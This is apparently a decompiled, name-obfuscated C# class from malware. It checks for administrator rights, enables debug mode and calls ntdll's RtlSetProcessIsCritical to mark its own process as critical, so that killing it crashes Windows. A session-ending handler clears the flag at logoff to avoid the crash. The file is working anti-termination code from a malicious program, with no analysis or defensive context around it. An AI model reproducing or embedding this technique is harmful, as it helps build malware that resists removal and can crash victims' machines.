using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace NebZuOsqGKsBdvX;

public static class WDFUQIeGaMaV
{
	public static bool Nyxahqcysep()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void STAqWLLxOsZytjPE(object sender, SessionEndingEventArgs e)
	{
		if (Nyxahqcysep())
		{
			ZpgJocDVEFuox();
		}
	}

	public static void bMAfJNpUBoSZD()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(STAqWLLxOsZytjPE));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void ZpgJocDVEFuox()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);
}
